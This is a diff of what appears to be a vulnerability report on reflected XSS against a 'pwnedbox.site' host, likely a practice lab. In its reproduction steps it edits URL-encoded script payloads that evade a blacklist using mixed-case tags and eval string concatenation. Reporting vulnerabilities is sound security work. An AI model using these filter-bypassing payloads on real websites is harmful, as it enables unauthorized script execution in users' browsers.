@@ -13,11 +13,11 @@ An attacker can bypass this blacklist using JavaScript string concatenation insi
 
 ## Steps to Reproduce
 <!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
-1. Visit `https://profile.pwnedbox.site/?fname=%27%22%3C%3E%3Cscript%3Eeval%28%22a%22%2B%22lert%281%29%22%29%3C%2Fscript%3E&lname=%27%22%3C%3E%3Cscript%3Eeval%28%22a%22%2B%22lert%281%29%22%29%3C%2Fscript%3E`
-2. The JavaScript payload executes and an alert `1` can be seen, confirming reflected XSS execution.
+1. Visit `https://account.pwnedbox.site/?fname=%27%22%3C%3E%3CscRIpt%3Eeval%28%22a%22%2B%22lert%281%29%22%29%3C%2FscRIpt%3E&lname=%27%22%3C%3E%3CscRIpt%3Eeval%28%22a%22%2B%22lert%281%29%22%29%3C%2FscRIpt%3E`
+2. The JavaScript payload executes and an alert `2` can be seen, confirming reflected XSS execution.
 ## POC (Proof of Concept)
 <!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
-**1. visit https://profile.pwnedbox.site/ and enter payload**
+**1. visit https://account.pwnedbox.site/ and enter payload**
 
 <img width="1584" height="815" alt="image" src="https://github.com/user-attachments/assets/d5e50fae-57a6-4cbd-9b4c-a0b977d4ff4f" />
 
